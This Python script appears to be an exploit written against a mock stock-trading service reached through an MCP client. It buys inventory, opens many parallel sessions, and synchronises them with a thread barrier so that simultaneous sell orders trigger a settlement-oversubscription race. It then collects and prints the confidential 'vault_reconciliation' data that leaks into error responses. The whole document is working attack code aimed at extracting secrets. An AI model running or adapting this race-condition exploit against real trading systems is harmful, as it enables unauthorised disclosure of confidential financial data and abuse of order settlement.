#!/usr/bin/env python3
"""Reliably trigger SETTLEMENT_OVERSUBSCRIPTION and capture the full vault_reconciliation."""
import json, threading, time, sys
from mcpclient import MCP, extract

NSELL = int(sys.argv[1]) if len(sys.argv) > 1 else 22

m = MCP()
pf = json.loads(extract(m.tool("get_portfolio")))
have = pf.get("positions", {}).get("AAPL", {}).get("shares", 0)
print("start:", pf)
if have < NSELL:
    qty = NSELL - have
    r = m.tool("place_order", {"symbol":"AAPL","quantity":qty,"order_type":"buy"}, timeout=120)
    print("buy inventory:", extract(r)[:100])
    time.sleep(1)

pool = []
for _ in range(NSELL):
    for _a in range(6):
        try:
            pool.append(MCP()); break
        except Exception as e:
            time.sleep(2)
N = len(pool)
print("sessions:", N)
barrier = threading.Barrier(N)
outs = [None]*N

def worker(i):
    barrier.wait()
    try:
        outs[i] = extract(pool[i].tool("place_order", {"symbol":"AAPL","quantity":1,"order_type":"sell"}, timeout=90))
    except Exception as e:
        outs[i] = "EXC "+str(e)

ths = [threading.Thread(target=worker, args=(i,)) for i in range(N)]
for t in ths: t.start()
for t in ths: t.join()

found = []
for o in outs:
    if o and ("vault_reconciliation" in o or "COMPROMISED" in o or "KPMG" in o or "TRADEBOT" in o):
        found.append(o)
print("=== LEAKED RESPONSES (full) ===")
for o in set(found):
    print(o)
    print("-"*60)
print("num leaks:", len(found))
print("risk:", extract(m.tool("get_risk_report")))
